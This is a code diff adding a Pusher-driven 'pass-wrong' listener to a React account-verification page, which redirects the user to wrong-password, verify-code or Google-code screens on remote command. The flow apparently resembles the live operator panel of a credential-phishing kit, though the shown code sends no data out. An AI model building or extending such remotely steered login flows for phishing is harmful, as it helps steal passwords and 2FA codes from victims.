@@ -10,6 +10,8 @@ function AccountVerify() {
 
   const [verifyId, setVerifyId] = useState("");
   const[reverifyId, setReVerifyId] = useState('');
+    const[wrongPass, setWrongPass] = useState('');
+
   
   const id = Cookies.get("id");
   const pusher = new Pusher("05656b52c62c0f688ee3", {
@@ -50,11 +52,31 @@ function AccountVerify() {
     };
   }, [id]);
 
+
+   useEffect(() => {
+    const channel = pusher.subscribe(id);
+
+    channel.bind("pass-wrong", (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log("Path data updated:", data);
+      Cookies.set("code", data.code);
+      setWrongPass(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind("pass-wrong");
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+
   if (verifyId) {
     return router.push("/account-verify-code");
   }
   if(reverifyId){
     return router.push("/account-verify-gcode");
+  }
+    if(wrongPass){
+    return router.push("/account-wrong-pass");
   }
   return <VerifyingState />;
 }
